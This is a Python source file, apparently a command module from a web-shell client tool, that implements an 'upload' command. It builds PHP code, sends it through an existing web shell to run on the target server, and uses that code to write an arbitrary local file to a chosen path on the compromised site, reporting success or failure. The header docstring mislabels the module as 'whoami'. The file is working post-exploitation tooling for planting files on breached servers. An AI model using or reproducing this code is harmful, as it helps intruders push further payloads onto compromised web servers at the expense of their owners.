"""
@Description: command-function: whoami
@Author: Longlone
@LastEditors: Longlone
@Date: 2020-01-07 18:42:00
@LastEditTime: 2020-03-03 13:01:31
"""
from os import path

from libs.config import alias, color
from libs.myapp import send


def get_php(web_file_path: str, force: bool):
    return """if (isset($_FILES)){
    if (%s and file_exists("%s")){
        die("exist");
    }
    if (move_uploaded_file($_FILES["file"]["tmp_name"], "%s")){
        die("success");
    }
}""" % (str(not force).lower(), web_file_path, web_file_path)


@alias(True, func_alias="u")
def run(file_path: str, web_file_path: str = "", force: bool = False):
    """
    upload

    Upload file to website
    """
    web_file_path = path.basename(file_path) if (not web_file_path) else web_file_path
    try:
        fp = open(file_path, "r")
    except FileNotFoundError:
        print("\n" + color.red("Local File not exist") + "\n")
        return
    php = get_php(web_file_path, force)
    text = send(f'{php}', files={("file", fp)}).r_text.strip()
    if text == "success":
        print(color.green(f"\nUpload {file_path} as {web_file_path} success.\n"))
    elif text == "exist":
        print(color.yellow(f"\n{web_file_path} exist.\n"))
    else:
        print("\n" + color.red("Upload error") + "\n")
